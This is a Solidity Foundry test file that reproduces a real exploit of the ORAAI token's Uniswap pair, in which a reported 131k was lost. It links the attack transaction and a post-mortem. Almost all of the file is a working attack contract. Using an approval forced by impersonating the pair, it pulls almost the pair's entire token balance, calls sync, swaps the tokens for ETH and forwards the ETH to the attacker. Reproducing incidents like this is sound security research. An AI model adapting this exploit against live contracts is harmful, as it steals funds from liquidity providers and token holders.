pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 131k
// Attacker : https://etherscan.io/address/0xa60fae100d9c3d015c9cd7107f95cbacf58a1cbd
// Attack Contract : 
// Vulnerable Contract : 
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x1b4730e715286862042def956d5aaa6a53203ee02b97ea913de73fa462e48f90?line=0
// Another Similar Tx : https://app.blocksec.com/explorer/tx/eth/0x872fcfcfd2e61ab5ec848f5e1a75b75f471bdb8c808c06388434e7179a9e40db

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1851445795918118927
// Twitter Guy : https://x.com/TenArmorAlert/status/1851445795918118927
// Hacking God : N/A

address constant ORAAI = 0xB0f34bA1617BB7C2528e570070b8770E544b003E;
address constant UniswapV2Pair = 0x6DABCbd75B29bf19C98a33EcAC2eF7d6E949D75D;
address constant UniswapV2Router02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
address constant addr1 = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant attacker = 0xa60fae100d9c3d015c9CD7107F95cBacF58A1CbD;
address constant addr2 = 0xD15Ef15ec38a0DC4DA8948Ae51051cC40A41959b;

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 21074245);
    }
    
    function testPoC() public {
        emit log_named_decimal_uint("before attack: balance of attacker", address(attacker).balance, 18);
        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        vm.stopPrank();

        vm.startPrank(UniswapV2Pair);
        IORAAI(ORAAI).approve(address(attC), type(uint256).max);
        vm.stopPrank();
        vm.startPrank(attacker, attacker);
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of attacker", address(attacker).balance, 18);
    }
}

contract AttackerC is Test {
    receive() external payable {}

    function attack() public {
        IORAAI(ORAAI).approve(UniswapV2Router02, type(uint256).max);

        uint256 pairBal = IORAAI(ORAAI).balanceOf(UniswapV2Pair);

        IORAAI(ORAAI).transferFrom(UniswapV2Pair, address(this), pairBal - 100);

        (bool s1, ) = UniswapV2Pair.call(abi.encodeWithSelector(IUniV2Pair.sync.selector));
        require(s1);
    
        uint256 bal = IORAAI(ORAAI).balanceOf(address(this));

        address weth = IUniswapV2Router02(UniswapV2Router02).WETH();

        address[] memory path = new address[](2);
        path[0] = ORAAI;
        path[1] = weth;
        IUniswapV2Router02(UniswapV2Router02).swapExactTokensForETHSupportingFeeOnTransferTokens(
            bal,
            0,
            path,
            address(this),
            block.timestamp
        );

        payable(attacker).transfer(address(this).balance);
    }
}

interface IORAAI {
	function balanceOf(address) external returns (uint256);
	function transferFrom(address, address, uint256) external returns (bool);
	function approve(address, uint256) external returns (bool);
    function allowance(address, address) external returns (uint256);
}

interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256, uint256, address[] calldata, address, uint256) external;
	function WETH() external returns (address); 
}

interface IUniV2Pair {
    function sync() external;
}